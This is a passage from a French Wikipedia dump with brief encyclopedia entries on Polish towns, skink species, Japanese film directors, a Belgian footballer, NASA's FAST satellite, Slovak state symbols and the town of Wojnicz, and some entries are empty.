Elle donne également naissance à cinq filles, dont deux seulement survivent au bas âge : Rose (1782-1832) et Marguerite (1798-1859), qui épouse Claude-Louis Mathieu en 1824.
La bibliothèque municipale d'Estagel porte le nom de Marie-Arago.

</doc>
<doc id="6805486" url="https://fr.wikipedia.org/wiki?curid=6805486" title="Alataou de Talas">
Alataou de Talas

L'Alataou de Talas, en kirghize : "Талас Ала-Тоосу" ; en kazakh : "Талас Алатауы" ; en russe : "Таласский Алатау", est un massif montagneux du Tian Shan occidental, dont la plus grande partie se trouve au Kirghizistan, une petite partie à la frontière méridionale du Kazakhstan et une autre dans la partie septentrionale de l'Ouzbékistan. Ce massif sépare la vallée de Talas d'autres massifs et vallées appartenant au système montagneux du Tian Shan occidental.
Il s'étend sur de longueur avec un point culminant au mont Manas (). Ses glaciers alimentent les rivières Talas et Arys. Des torrents forment plus en amont la rivière Pskem. Sa végétation est de type alpin ou subalpin avec des pâtures.
On trouve quatre cols principaux dans le massif dont le col d'Ötmök (fermé en hiver) qui marque l'entrée à l'est. La route principale de Bichkek à Och passe par le col d'Ala-Bel, à l'est, et traverse la réserve naturelle du Tchitchkan avant de se diriger vers le sud vers un autre col qui mène à la province de Jalal-Abad. Le col de Kara-Bououra (route) et le col de Terek (pas de route importante) conduisent également au sud. Le sud du massif est bordé par la vallée du Tchatkal.

</doc>
<doc id="6805489" url="https://fr.wikipedia.org/wiki?curid=6805489" title="Tropidophorus micropus">
Tropidophorus micropus

Tropidophorus micropus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Bornéo. Elle se rencontre au Kalimantan en Indonésie et dans les États du Sabah et du Sarawak en Malaisie orientale.

</doc>
<doc id="6805491" url="https://fr.wikipedia.org/wiki?curid=6805491" title="Azincourt (roman)">
Azincourt (roman)

Azincourt est un roman historique écrit par Bernard Cornwell, publié en 2008. Le livre retrace les événements qui ont mené à la bataille d'Azincourt à la fin du Moyen Âge durant la guerre de Cent Ans. Aux États-Unis le livre a été publié sous le titre d"'Agincourt". L'histoire suit le parcours d'un archer anglais, Nick Hook.
En 2009, un projet d'adaptation du roman en film est lancé par Michael Hirst. En 2013, le projet repart de zéro, l'écriture du scénario est confiée à Stuart Hazeldine par Michael Mann en 2013.

</doc>
<doc id="6805492" url="https://fr.wikipedia.org/wiki?curid=6805492" title="Maków Podhalański">
Maków Podhalański

Maków Podhalański est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Maków Podhalański, dans le powiat de Sucha.

</doc>
<doc id="6805493" url="https://fr.wikipedia.org/wiki?curid=6805493" title="Fête de l'indépendance de la Finlande">
Fête de l'indépendance de la Finlande



</doc>
<doc id="6805494" url="https://fr.wikipedia.org/wiki?curid=6805494" title="Tropidophorus sinicus">
Tropidophorus sinicus

Tropidophorus sinicus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre :
Description.
C’est un saurien vivipare de petite taille (environ 14 centimètres) vivant proche des rivières et cours d'eau.
Cette espèce est semi-aquatique et supporte mal les températures excédant 30 °C.

</doc>
<doc id="6805495" url="https://fr.wikipedia.org/wiki?curid=6805495" title="Toshio Sugie">
Toshio Sugie

, né le et mort le est un réalisateur japonais.
Biographie.
Après des études à l'université Waseda, Toshio Sugie rejoint la P.C.L. en 1937 qui devient la Tōhō en septembre de cette même année, à la suite d'une fusion. Il travaille en tant qu'assistant réalisateur auprès de cinéastes tels que Yasujirō Shimazu et Akira Kurosawa. Il fait ses débuts en tant que réalisateur en 1950 avec "Tōkyō no mon".
Toshio Sugie a réalisé près de 70 films entre 1950 et 1969.

</doc>
<doc id="6805504" url="https://fr.wikipedia.org/wiki?curid=6805504" title="Arts martiaux de l'Insulinde">
Arts martiaux de l'Insulinde



</doc>
<doc id="6805506" url="https://fr.wikipedia.org/wiki?curid=6805506" title="Équipe cycliste Davo">
Équipe cycliste Davo



</doc>
<doc id="6805508" url="https://fr.wikipedia.org/wiki?curid=6805508" title="Équipe cycliste Davo-Lotto-Davitamon">
Équipe cycliste Davo-Lotto-Davitamon



</doc>
<doc id="6805510" url="https://fr.wikipedia.org/wiki?curid=6805510" title="Équipe cycliste Davo-Lotto">
Équipe cycliste Davo-Lotto



</doc>
<doc id="6805513" url="https://fr.wikipedia.org/wiki?curid=6805513" title="Mszana Dolna">
Mszana Dolna

Mszana Dolna est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle constitue une gmina urbaine du powiat de Limanowa.

</doc>
<doc id="6805518" url="https://fr.wikipedia.org/wiki?curid=6805518" title="Inframonde">
Inframonde



</doc>
<doc id="6805519" url="https://fr.wikipedia.org/wiki?curid=6805519" title="Tropidophorus hainanus">
Tropidophorus hainanus

Tropidophorus hainanus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre :
Étymologie.
Cette espèce est nommée en référence au lieu de sa découverte, la province du Hainan.

</doc>
<doc id="6805522" url="https://fr.wikipedia.org/wiki?curid=6805522" title="Tropidophorus laotus">
Tropidophorus laotus

Tropidophorus laotus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre en Thaïlande et au Laos.
Étymologie.
Cette espèce est nommée en référence au lieu de sa découverte, le Laos.

</doc>
<doc id="6805523" url="https://fr.wikipedia.org/wiki?curid=6805523" title="Czchów">
Czchów

Czchów est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Czchów, dans le powiat de Brzesko.

</doc>
<doc id="6805527" url="https://fr.wikipedia.org/wiki?curid=6805527" title="Tropidophorus thai">
Tropidophorus thai

Tropidophorus thai est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre dans le nord de la Thaïlande et en Birmanie.
Étymologie.
Cette espèce est nommée en référence au lieu de sa découverte, la Thaïlande.

</doc>
<doc id="6805530" url="https://fr.wikipedia.org/wiki?curid=6805530" title="Tropidophorus robinsoni">
Tropidophorus robinsoni

Tropidophorus robinsoni est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre en Thaïlande et en Birmanie.
Étymologie.
Cette espèce est nommée en l'honneur d'Herbert Christopher Robinson.

</doc>
<doc id="6805534" url="https://fr.wikipedia.org/wiki?curid=6805534" title="Gare de Nishi-Kokubunji">
Gare de Nishi-Kokubunji

La est une gare ferroviaire de la ville de Kokubunji, dans la préfecture de Tokyo au Japon. Elle est exploitée par la compagnie JR East.
Situation ferroviaire.
La gare de Nishi-Kokubunji est située au point kilométrique (PK) 32,8 de la ligne Chūō et au PK 32,7 de la ligne Musashino.
Histoire.
La gare a été inaugurée le .
Services aux voyageurs.
Accès et accueil.
La gare dispose d'un bâtiment voyageurs, avec guichet, ouvert tous les jours.

</doc>
<doc id="6805535" url="https://fr.wikipedia.org/wiki?curid=6805535" title="Dobczyce">
Dobczyce

Dobczyce est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Dobczyce, dans le powiat de Myślenice.

</doc>
<doc id="6805537" url="https://fr.wikipedia.org/wiki?curid=6805537" title="Équipe d'Italie de futsal AMF">
Équipe d'Italie de futsal AMF

L’Équipe Nationale Italienne de football en salle (AMF) dans sa version sud-américaine, c’est-à-dire avec les règles de l’Association Mondiale de Futsal, est dirigée par la Fédération Italienne de Football en Salle (FIFS) et représente l’Italie dans les diverses compétitions officielles ou amicales réservées à des équipes nationales. 
Histoire.
L'équipe commence son activité en 1987 et l’année suivante elle participe à sa première compétition internationale : le Championnat Mondiale de futsal masculin 1988, qui se déroule en Australie, où elle se classe neuvième. En 1989, elle participe à son premier Championnat Européen UEFS, joué en Espagne, où elle se classe sixième.
Après avoir participé au Championnat Européen qui se déroule en Portugal en 1990 et où elle se classe à la huitième place, la FIFS a l’honneur d’organiser le Championnat Mondial FIFUSA en 1991, où l’Italie se classe vingtième. Avec la sixième place au Championnat Européen de l’année suivante (1992) l’Italie se qualifie au Championnat Mondial de 1994 en Argentine, ce qui constitue sa dernière apparition en compétitions mondiales organisées par la FIFUSA. Le résultat est décevant : la sélection italienne est éliminée dès le premier tour de la compétition. 
À noter que l'équipe participe par ailleurs à trois éditions de la « Coppa Latina » (Coupe Latine), en 1991, 1992 et 1998.
La Nationale Italienne ne se réunit plus pendant la période dormante de la Fédération Italienne de Football en Salle, mais avec l’arrivée d'Axel Paderni (2009), la FIFS reprend ses activités et la Nationale aussi, en participant à trois éditions du Munidalito Cup Tournament organisé par l’International Futsal World League Association : en 2010 l’Italie se classe quatrième à Cornaredo et pour deux années consécutives (2011 et 2012), première à Agrate Brianza.
À partir d’, avec la reconnaissance de la FIFS par l’AMF, celle-ci rentre officiellement dans les compétitions internationales de l’Association Mondiale de Futsal.

</doc>
<doc id="6805547" url="https://fr.wikipedia.org/wiki?curid=6805547" title="Tropidophorus perplexus">
Tropidophorus perplexus

Tropidophorus perplexus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Bornéo. Elle se rencontre au Kalimantan en Indonésie et dans les États du Sabah et du Sarawak en Malaisie orientale.
Étymologie.
Le nom spécifique "perplexus" vient du latin "", embrouillé, en référence au fait que la squamation de la tête de ce saurien est identique à celle de "Tropidophorus brookei".

</doc>
<doc id="6805551" url="https://fr.wikipedia.org/wiki?curid=6805551" title="Joaquín Peinado">
Joaquín Peinado

Joaquín Ruiz-Peinado Vallejo, dit Joaquín Peinado (né à Ronda le et mort à Paris le ), fut un peintre cubiste espagnol et un des plus grands représentants de l'« École espagnole de Paris ».
Biographie.
En 1915 il intègre l'École supérieure de commerce de Séville, où il restera jusqu'en 1918. Cette même année, il abandonne ses études de commerces pour intégrer l'Académie royale des beaux-arts de San Fernando de Madrid, où il sera l'élève de Julio Romero de Torres et de Cecilio Plá.
En 1923 il voyage à Paris, où il connaîtra et deviendra ami de Picasso et Luis Buñuel, entre autres membres de la colonie espagnole, appelée plus tard l'« École espagnole de Paris ». Il étudie à l'Académie Ranson, à l'Académie Calarossi et à l'Académie de la Grande Chaumière, découvrant ainsi la peinture cubiste qui marquera par la suite son œuvre.
Après avoir participé à diverses expositions, il voyage à Amsterdam en 1926 où il travaillera sur les décors de l'œuvre de Manuel de Falla "", que dirige son ami Buñuel.
En 1927 il gagne le prix de peinture du Conseil de Malaga et revient en Espagne où il participera comme illustrateur dans plusieurs revue, comme "Litoral" de Málaga ou "" de Madrid. Il participe à de grandes expositions collectives sur la peinture d'avant-garde : L' "Exposition de peintures et sculptures d'Espagnols résidant à Paris" à Madrid et l' "Exposition Régionale d'Art Moderne" à Grenade.
Ses idées républicaines le poussent à participer, depuis Paris, à des tâches de propagande avec le gouvernement de la Seconde République espagnole lors de la Guerre civile espagnole. Il reste à Paris pendant pratiquement toute la Seconde Guerre mondiale, et en 1946 il participe, en tant que délégué de la Section des peintres espagnols de l'École de Paris, à l'exposition internationale organisée par l'Unesco et sera présent, avec Francisco Bores, Óscar Domínguez, Ginés Parra, José Palmeiro et Pablo Picasso, à l'exposition célébrée dans la Galerie nationale à Prague intitulée « Art de l'Espagne républicaine ; Artistes de l'École de Paris ».
Après avoir voyagé et exposé dans plusieurs pays d'Amérique, il revient en Espagne en 1969 où il sera nommé membre de l' de Málaga.
Il meurt le à Paris, à l'hôpital Cochin, à l'âge de 76 ans.
Ronda, sa ville natale, a fait construire le .
Conservation.
Les œuvres de Peinado sont conservées dans plusieurs musées dans le monde:

</doc>
<doc id="6805555" url="https://fr.wikipedia.org/wiki?curid=6805555" title="Słomniki">
Słomniki

Słomniki est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Słomniki, dans le powiat de Cracovie.

</doc>
<doc id="6805558" url="https://fr.wikipedia.org/wiki?curid=6805558" title="Symboles étatiques de la République slovaque">
Symboles étatiques de la République slovaque

Les Symboles étatiques de la République slovaque () officiel de la république slovaque sont au nombre de quatre et sont définis par la loi N° 63/1993. 
Les armoiries.
Le blason de la Slovaquie est un écu de type néogothique de gueules à la double croix d'argent sur le pic central d'un groupe de trois collines d'azur.
Le drapeau.
Le drapeau de la Slovaquie a été adopté le . C'est un drapeau tricolore composé de trois bandes horizontales reprenant les couleurs panslaves : la bande supérieure est blanche, l'intermédiaire bleue et l'inférieure rouge. L'écu national est placé sur le drapeau pour le distinguer des autres drapeaux slaves : décalé du côté de la hampe, il empiète sur les bandes supérieure et inférieure du drapeau. Les proportions du drapeau sont 2:3. Ce drapeau aux dimensions d' × est également le pavillon de la marine marchande slovaque.
L'hymne.
L'hymne est défini comme étant les deux premières strophes de la chanson Nad Tatrou sa blýska:
Le sceau.
Le sceau de la République slovaque est rond, en son centre sont représentées les armoiries autour de celle-ci on retrouve l'inscription « SLOVENSKÁ REPUBLIKA ». Dans le dessous du cercle se situe une feuille de tilleul. Son diamètre est de .

</doc>
<doc id="6805560" url="https://fr.wikipedia.org/wiki?curid=6805560" title="Symboles de la République slovaque">
Symboles de la République slovaque



</doc>
<doc id="6805564" url="https://fr.wikipedia.org/wiki?curid=6805564" title="Georg Karl von Fechenbach">
Georg Karl von Fechenbach

Georg Karl Ignaz Freiherr von Fechenbach zu Laudenbach (né le à Mayence, mort le à Bamberg) est le dernier prince-évêque de Wurtzbourg.
Biographie.
Georg Karl von Fechenbach appartient à la .
Il devient prêtre le . Il est élu évêque de Wurtzbourg le et est consacré par Charles-Théodore de Dalberg avec comme co-consécrateurs et Charles Alexander d'Arberg, le pape Pie VI le confirme le .
Il consacre son oncle Christoph Franz von Buseck évêque de Bamberg le . Toutefois Buseck pensa démissionner ensuite afin d'unifier les évêchés de Bamberg et de Wurtzbourg sous la personne de son neveu. Fechenbach devient coadjuteur de son oncle jusqu'à sa mort en 1805. 
Après le traité de Lunéville en 1801, les principautés-évêchés sont dissous. Après l'occupation de l'armée bavaroise dirigée par le général , Fechenbach démissionne de son titre de prince le et reste évêque. Il défend son pouvoir spirituel lors de la sécuralisation de la Bavière, mise en œuvre par puis Maximilian von Montgelas, qui confisque les bâtiments, les églises et les objets de valeur.
Après le traité de Presbourg en 1805, la principauté de Wurtzbourg est confiée au prince-électeur de Salzbourg, Ferdinand III de Toscane puis le à la confédération du Rhin. Lorsqu'elle revient à la Bavière, après la mort de Fechenbach, l'évêque auxiliaire obtient des concessions. À Würzburg et Bamberg, les sièges sont vacants de 1808 à 1818.
Le de Wurtzbourg sera en 1818 Adam Friedrich Groß zu Trockau, le vicaire apostolique de Bamberg depuis 1812.
Succession apostolique.
Georg Karl von Fechenbach a ordonné les évêques suivants :

</doc>
<doc id="6805572" url="https://fr.wikipedia.org/wiki?curid=6805572" title="Tropidophorus baconi">
Tropidophorus baconi

Tropidophorus baconi est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Sulawesi en Indonésie.
Étymologie.
Cette espèce est nommée en l'honneur de James Patterson Bacon.

</doc>
<doc id="6805576" url="https://fr.wikipedia.org/wiki?curid=6805576" title="Skała (Petite-Pologne)">
Skała (Petite-Pologne)

Skała est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Skała, dans le powiat de Cracovie.

</doc>
<doc id="6805584" url="https://fr.wikipedia.org/wiki?curid=6805584" title="Świątniki Górne">
Świątniki Górne

Świątniki Górne est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Świątniki Górne, dans le powiat de Cracovie.

</doc>
<doc id="6805589" url="https://fr.wikipedia.org/wiki?curid=6805589" title="Principauté-Primauté d'Ibérie">
Principauté-Primauté d'Ibérie



</doc>
<doc id="6805590" url="https://fr.wikipedia.org/wiki?curid=6805590" title="Sculpting in Time">
Sculpting in Time



</doc>
<doc id="6805592" url="https://fr.wikipedia.org/wiki?curid=6805592" title="Route nationale 87 (Belgique)">
Route nationale 87 (Belgique)

La route nationale 87 est une route nationale de Belgique qui relie Parette (Attert), près de la frontière luxembourgeoise, à Virton, près de la frontière française. Elle traverse le sud de la province de Luxembourg en suivant un axe nord-est/sud-ouest.

</doc>
<doc id="6805598" url="https://fr.wikipedia.org/wiki?curid=6805598" title="Szczucin">
Szczucin

Szczucin est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Szczucin, dans le powiat de Dąbrowa.
Histoire.
En 1939, 40 % de la population est juive, les membres de cette communauté disparaîtront lors d'exécutions de masse et de la déportation au ghetto de Tarnow puis au Camp d'extermination de Bełżec.

</doc>
<doc id="6805605" url="https://fr.wikipedia.org/wiki?curid=6805605" title="Zator (Petite-Pologne)">
Zator (Petite-Pologne)

Zator est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Zator, dans le powiat d'Oświęcim.
Zator fut autrefois le siège du duché de Zator.

</doc>
<doc id="6805606" url="https://fr.wikipedia.org/wiki?curid=6805606" title="Ramon Roelofs">
Ramon Roelofs



</doc>
<doc id="6805611" url="https://fr.wikipedia.org/wiki?curid=6805611" title="Steven Wostijn">
Steven Wostijn

Steven Wostijn, né à Harelbeke (Belgique) le , est un footballeur belge. Il a évolué durant toute sa carrière comme milieu de terrain. Il fait partie des trois joueurs, avec Joris De Tollenaere et , à avoir disputé les six saisons en Division 1 du KRC Harelbeke. Depuis 2011, il défend les couleurs du SC Oostrozebeke, un club de troisième provinciale de Flandre-Occidentale.
Carrière.
Début de carrière, de la Division 2 à l'Europe.
Steven Wostijn s'affilie au KRC Harelbeke en 1984. Il progresse dans les différentes équipes d'âge du club, dont l'équipe première évolue en Division 2. Il est intégré au noyau de l'équipe première au début de la saison 1994-1995. Il dispute son premier match officiel le face à Lokeren. Ce sera son seul match de la saison, son club décroche la promotion en Division 1 via le tour final.
Pour sa première saison parmi l'élite nationale, Steven Wostijn est cantonné à l'équipe réserve. Appelé sporadiquement dans le noyau, il reste à chaque fois sur le banc. Il monte au jeu une seule fois durant le championnat, le contre le Cercle de Bruges. Malgré ce temps de jeu réduit, il reste au club la saison suivante, durant laquelle il joue plus souvent. Il joue seize rencontres en championnat, dont une comme titulaire. Il inscrit ses deux premiers buts lors de la saison 1997-1998, à l'occasion de la réception de La Gantoise le . Cette année-là, Harelbeke lutte jusqu'à la dernière journée avec Anderlecht pour décrocher la dernière place qualificative en Coupe UEFA. Finalement, le club bruxellois termine devant, reléguant Harelbeke en Coupe Intertoto.
Steven Wostijn dispute son seul match européen lors de cette Coupe Intertoto 1998, face à la Sampdoria. Harelbeke est éliminé par les Italiens et ne disputera plus jamais de compétition européenne. En championnat, Wostijn s'affirme au fil des semaines comme un joueur de base de l'équipe, un statut qu'il conserve pendant trois saisons. En 2001, le club termine à l'avant-dernière place, synonyme de relégation en deuxième division. Courtisé par d'autres clubs de l'élite, le joueur décide de quitter son « club de toujours » et poursuit sa carrière au KSK Beveren.
Dernières années en Division 1.
À Beveren, Steven Wostijn obtient directement une place de titulaire dans l'équipe. Il inscrit son premier but pour son nouveau club dès son deuxième match. Au niveau collectif par contre, les résultats sont très mauvais et le club termine largement dernier en fin de saison. Relégué sportivement, le club flandrien peut se maintenir au plus haut niveau grâce aux rétrogradations administratives infligées au RWDM et Alost, permettant ainsi à Wostijn et ses coéquipiers de continuer à jouer en Division 1.
Malgré l'arrivée de nombreux renforts ivoiriens, Steven Wostijn conserve sa place dans l'effectif de Beveren pendant deux saisons. Écarté des terrains d'octobre 2003 à février 2004 à la suite d'une blessure, il retrouve un poste de titulaire en fin de saison. Malgré cela, son contrat n'est pas prolongé par la direction du club. Il dispute son dernier match en première division le et quitte ensuite gratuitement Beveren.
Fin de carrière dans les divisions inférieures.
Après neuf saisons au plus haut niveau, Steven Wostijn fait un pas en arrière et rejoint le SV Zulte Waregem, en Division 2. Il participe activement à la conquête du titre en fin de saison, malgré une place de titulaire dans l'équipe, il n'accompagne pas ses équipiers parmi l'élite. Il s'engage alors au RFC Tournai, un club de Division 3 ambitieux. La saison n'est pas à la hauteur des espérances et après un an, il décide de retourner à Waregem mais cette fois au Racing, tout juste promu en deuxième division pour la première fois de son histoire.
Le club a des difficultés à s'adapter au niveau supérieur et après une seule saison, il est relégué en troisième division. À nouveau, Steven Wostijn quitte son club douze mois après son arrivée. Cette fois, il redescend en Promotion, où il s'engage au SC Wielsbeke, un club voisin. Après un début de compétition moyen, le club termine le championnat en boulet de canon. Il remporte 28 points sur 30 lors des dix derniers matches, coiffant ainsi tous ses rivaux et décrochant le titre de champion dans sa série pour avoir remporté une victoire de plus que Sint-Eloois-Winkel Sport, ex-æquo au nombre de points. Cette fois, il reste au club après le titre, toutefois, la première saison de l'équipe en Division 3 est difficile, le club lutte pour le maintien jusqu'au dernier match. En fin de saison, il est relégué sportivement après un test-match perdu face au RRC Peruwelz mais sera réintégré deux mois plus tard à la suite de diverses réclamations.
Steven Wostijn choisit néanmoins de quitter le club et rejoint Sint-Eloois-Winkel Sport, qui vient de terminer vice-champion de Promotion pour la troisième saison consécutive. Son arrivée ne permet pas au club d'obtenir de meilleurs résultats et après deux ans, il arrête le football au niveau national. Il rejoint le petit club du SC Oostrozebeke, en troisième provinciale. Il annonce en octobre 2012 qu'il raccrochera définitivement les crampons en fin de saison.

</doc>
<doc id="6805612" url="https://fr.wikipedia.org/wiki?curid=6805612" title="Yasujirō Shimazu">
Yasujirō Shimazu

, né le et mort le , est un réalisateur et scénariste japonais. Il fut l'un des grands créateurs du genre "shōshimingeki" (films sur la classe moyenne) aux studios Shōchiku avant la Seconde Guerre mondiale.
Biographie.
Né dans le quartier Kanda de Tokyo, Yasujirō Shimazu entre aux studios Shōchiku en 1920 après avoir répondu à une annonce et commence à travailler sous Kaoru Osanai. Reconnu comme réalisateur à partir de 1923, il se spécialise dans les films sur la classe moyenne ("shōshimingeki") qui sont favorisés aux studios Shōchiku de Kamata.
Il travaille de façon indépendante particulièrement à l'époque du cinéma sonore, mais rejoint finalement les studios Tōhō avec lesquels il réalise quelques films en coopération avec l'Association cinématographique du Mandchoukouo. Il meurt d'un cancer du poumon, juste après la fin de la guerre. De nombreux réalisateurs renommés tels que Heinosuke Gosho, Shirō Toyoda, Kōzaburō Yoshimura et Keisuke Kinoshita se sont formés à ses côtés.
Il a réalisé 160 films entre 1921 et 1944.

</doc>
<doc id="6805619" url="https://fr.wikipedia.org/wiki?curid=6805619" title="Fast Auroral Snapshot Explorer">
Fast Auroral Snapshot Explorer

Fast Auroral Snapshot Explorer ou FAST ou Explorer 70 est un petit satellite scientifique du Programme Small Explorer de la NASA lancé en 1996 pour étudier les aurores polaires. Placé sur une orbite elliptique haute lui permettant de traverser à chaque orbite les régions de l'espace où se forment les aurores, il a collecté avec ses instruments de nombreuses données sur les champs magnétiques et électriques, les ondes de plasma, les électrons et ions chargés d'énergie, la répartition de la masse des ions, la densité et la température du plasma thermique. Les opérations scientifiques se sont achevées en 1999.
Contexte.
FAST est la deuxième mission du Programme Small Explorer de la NASA. Ce programme rassemble des missions spatiales scientifiques dont le cout, y compris le lancement et la gestion opérationnelle, est plafonné à 120 millions $.
Objectifs.
Les aurores polaires sont des phénomènes qui apparaissent aux latitudes hautes. Elles sont le produit de l'activité magnétique du Soleil qui subit des variations d'intensité selon un cycle de 11 ans. Le champ magnétique terrestre est affecté par le vent solaire créé par cette activité qui est à l'origine des aurores polaires. Les aurores visibles sont produites par des électrons accélérés qui viennent se heurter aux molécules et atomes de la haute atmosphère à des altitudes comprises entre provoquant l'excitation des gaz. L'accélération des électrons est toutefois déclenchée à des altitudes bien plus hautes, entre . La mission de FAST est d'apporter des informations sur les processus en jeu et en particulier :
Caractéristiques techniques.
Le satellite FAST a une structure en aluminium comprenant une seule étagère sur laquelle sont rassemblés les instruments scientifiques et les principaux équipements électroniques. Ce choix permet de limiter le moment d'inertie et de mettre en œuvre les très longues antennes utilisées. Deux antennes du magnétomètre s'étendent de part et d'autre du satellite dans l'axe de rotation. Deux autres antennes axiales et quatre antennes radiales sont déployées après le lancement. Une coque cylindrique dont la taille est fixée par la surface de cellules solaires nécessaire pour produire l'énergie dont a besoin le satellite encapsule l'étagère mais également un grand espace vide du fait de l'optimisation du moment d'inertie. L'énergie est fournie par les cellules solaires qui recouvrent la surface du satellite représentant une surface de . L'énergie produite est comprise entre . Le satellite est spinné à 12 tours par minute.
Instrumentation scientifique.
FAST embarque quatre instruments scientifiques :
Déroulement de la mission.
La date de lancement est choisie pour optimiser les observations en hiver de l'hémisphère nord et de manière à se synchroniser avec des campagnes d'observation depuis le sol et par le satellite Polar. FAST est lancé le par une fusée
Pegasus sur une orbite haute elliptique de 350 × que le satellite parcourt en 133 minutes. L'apogée retenue permet à FAST de traverser la région qui s'étend entre où les particules qui sont à l'origine des aurores sont accélérées. Les données recueillies sont stockées sur une mémoire de masse à semi-conducteurs puis transmises au sol lorsque le satellite est à portée de la station au sol avec un débit de . Le volume de données produit en une journée oscille entre 1 gigaoctet et 5 gigaoctets durant les campagnes. Durant ces dernières les relevés du satellite sont effectués de manière coordonnée avec des observations effectuées depuis le sol, d'autres satellites ou des avions. La gestion des opérations techniques et scientifiques du satellite est réalisée depuis un centre dédié installé sur le campus de l'Université de Californie à Berkeley.
Résultats scientifiques.
La mission a été une réussite scientifique. Elle a permis notamment de confirmer que les champs électriques créées par la rencontre du vent solaire et de l'ionosphère sont à l'origine de l'accélération des électrons issus de la magnétosphère et donc des aurores solaires. En parallèle des ions issus de l'ionosphère sont également accélérés et expulsés vers le haut.

</doc>
<doc id="6805626" url="https://fr.wikipedia.org/wiki?curid=6805626" title="Wojnicz">
Wojnicz

Wojnicz est une ville historique de Pologne datant du , située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Wojnicz, dans le powiat de Tarnów. Pendant son histoire millénaire, la ville a souffert les incendies au moins huit fois. Depuis 1109 la paroisse est dédiée à Saint Laurent, martyre romain qui figure aussi sur le blason de la ville. Son droit urbain accordé en 1239, est supprimé en 1934 et restitué en 2007.
Géographie.
Wojnicz se situe sur le Dunajec, confluent important de la Vistule. Le site de la ville se trouve sur la frontière de deux zônes géographiques distinctes: d'une part le bassin de Sandomierz et de l'autre la chaîne des Carpates occidentales dominant la ville au sud. Elle est sur le carrefour de la Route européenne 40 et la nationale 975 entre Dąbrowa Tarnowska et Nowy Sącz.
Origines du nom.
En 1217 la ville est nommée "Woynicze". En 1224, le nom parait comme "Woyniz", et par la suite en 1239, "Woynicz". Deux philologues polonais, Kazimierz Rymut et Stanisław Rospond estiment que le nom Wojnicz dérive du surnom "Wojna", racine du mot "guerre" ou "guerrier" en polonais, qui se transforme d'abord en "Wojnice" puis "Wojnic", et finalement en Wojnicz.
Histoire.
Wojnicz est une des plus anciennes villes de la Petite-Pologne ainsi que de la Pologne. Des fouilles archéologiques ont permis d’établir qu’au néolithique le site était déjà habité. Une ville est apparue au Xè siècle, tirant avantage de sa situation sur d’importantes routes commerciales entre la Pologne et la Hongrie qui descendaient au Danube et l'Empire byzantin. La première mention historique de la ville date du début du quand le chroniqueur Gallus Anonymus la range dans les principales villes polonaises, aux côtés de Cracovie. Avant les inondations et le changement du litoral du fleuve Dunajec vers l'est, ce fut le cite d'une fortification aujourd'hui largement disparue.
Quand Boleslas III le Bouche-Torse partage la Pologne entre ses fils, issu du "démembrement territorial" du royaume de Pologne. En 1239, alors qu’il n’a que 13 ans, Boleslas V est fiancé à Wojnicz avec Kinga de Pologne, la fille du roi Béla IV de Hongrie, âgée de 5 ans. Le mariage aura lieu en 1247. À ce moment la ville est accordée un Privilège urbain, confirmé dans les chroniques le , qui en 1349 se transforme formellement en droits de Magdebourg.
À la suite de la réunification des territoires polonais au , la Castellanie de Wojnicz est intégrée au royaume. Une commune juive y est créée. À cette époque, la ville compte 3 000 habitants et est une des plus grandes villes du pays. Au milieu du , Wojnicz est incendiée encore une fois.
Déjà en 1465 une chronique de Jan de Lutowic décrit l'église de St. Léonard, en tant que filiale de la collégiale de Wojnicz, comme possédant une Infirmerie pour les pauvres et sa propre ferme pour nourrir les patients.
La ville a continué à prospérer jusqu’au . L’âge d’or de la ville a brutalement pris fin le quand a eu lieu la "Bataille de Wojnicz" entre les forces polonaises et celles des Suédois victorieux qui s’emparent de la ville durant le Déluge, une des périodes les plus sombres de l’histoire de la Pologne. Après avoir brièvement occupé la ville, les Suédois se sont retirés après avoir détruit le centre-ville et fortement endommagé les autres constructions. Par la suite, la régression économique de la Pologne affecte fortement la ville. Un grand incendie en 1702, lors de la Guerre du nord et le premier partage de la Pologne en 1772, qui place Wojnicz en Autriche, contribuent au déclin de la ville.
Culture locale et patrimoine.
Plaques commémoratives.
Entre autres, se trouvent dans le centre-ville:
Une deuxième plaque au même endroit commémore la visite de Sainte Hedwige Ire de Pologne le .

</doc>
<doc id="6805628" url="https://fr.wikipedia.org/wiki?curid=6805628" title="Antisleep Vol. 2">
Antisleep Vol. 2

Antisleep Vol.2 est le troisième album du multi-instrumentiste Bret Autrey, fondateur du projet de rock électronique , sorti en , et son deuxième album instrumental, après "".

</doc>
<doc id="6805630" url="https://fr.wikipedia.org/wiki?curid=6805630" title="Luigi De Canio">
Luigi De Canio

Luigi De Canio, né le à Matera (Basilicate), est un footballeur italien, reconverti comme entraîneur.

</doc>
<doc id="6805631" url="https://fr.wikipedia.org/wiki?curid=6805631" title="Xylolalie">
Xylolalie



</doc>
<doc id="6805633" url="https://fr.wikipedia.org/wiki?curid=6805633" title="Erland van Lidth de Jeude">
Erland van Lidth de Jeude

Erland van Lidth de Jeude est un acteur américain d'origine néerlandaise né le à Hilversum, aux Pays-Bas et mort le à New York, connu aussi comme lutteur et .
Biographie.
